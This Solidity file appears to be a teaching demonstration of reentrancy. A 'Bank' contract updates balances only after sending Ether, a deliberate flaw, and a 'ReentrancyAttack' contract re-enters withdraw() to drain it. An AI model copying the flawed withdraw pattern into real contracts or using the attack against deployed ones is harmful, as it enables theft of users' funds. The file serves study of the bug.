// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

contract Bank {
    // Declares a mapping to store the balance of each user.
    mapping(address => uint) public balances;

    // @notice Deposit the specified amount of Ether into the contract.
    // The function is payable, allowing it to receive Ether.
    function deposit() public payable {
        // Increases the sender's balance by the amount of Ether sent.
        balances[msg.sender] += msg.value;
    }

    // @notice Withdraw the entire balance of the sender from the contract.
    function withdraw() public {
        // Retrieves the balance of the sender.
        uint balance = balances[msg.sender];
        // Ensures that the sender has a positive balance.
        require(balance > 0, "No funds available to withdraw");
        // Attempts to send the Ether to the sender.
        (bool sent, ) = msg.sender.call{value: balance}("");
        // Ensures that the Ether transfer was successful.
        require(sent, "Failed to send Ether");
        // Resets the sender's balance to zero.
        balances[msg.sender] = 0;
    }

    // @notice Get the balance of Ether held by the contract.
    // @return The balance of the contract in wei.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrancyAttack {
    // Declares a variable to hold the instance of the Bank contract.
    address payable bankAddress;
    uint public countWithdraw;
    uint public attackerBalance;

    // @param _bankAddress The address of the Bank contract to attack.
    // Initializes the contract with the address of the target Bank contract.
    constructor(address payable _bankAddress) {
        // Sets the bank instance to interact with the target Bank contract.
        bankAddress = _bankAddress;
        countWithdraw = 0;
    }

    // Receive function to receive Ether and re-enter the Bank contract.
    receive() external payable {
        // If the Bank contract has at least 1 Ether, withdraw from it.
        if (bankAddress.balance >= 1 ether) {
            Bank(bankAddress).withdraw();
            countWithdraw++;
        }
    }

    // @notice Initiates the reentrancy attack.
    // Requires at least 1 Ether to start the attack.
    function attack() external payable {
        // Ensures that the attacker sends at least 1 Ether.
        require(msg.value >= 1 ether);
        // Deposits 1 Ether into the Bank contract.
        Bank(bankAddress).deposit{value : 1 ether}();
        // Withdraws the Ether, triggering the receive function.
        Bank(bankAddress).withdraw();
        countWithdraw++;

        attackerBalance = address(this).balance;
        payable(msg.sender).transfer(attackerBalance);
    }

    // @notice Get the balance of Ether held by the attacking contract.
    // @return The balance of the attacking contract in wei.
    function getBalance() public view returns (uint) {
        // Returns the balance of the attacking contract.
        return address(this).balance;
    }

    function getCountWithdraw() public view returns (uint) {
        return countWithdraw;
    }
}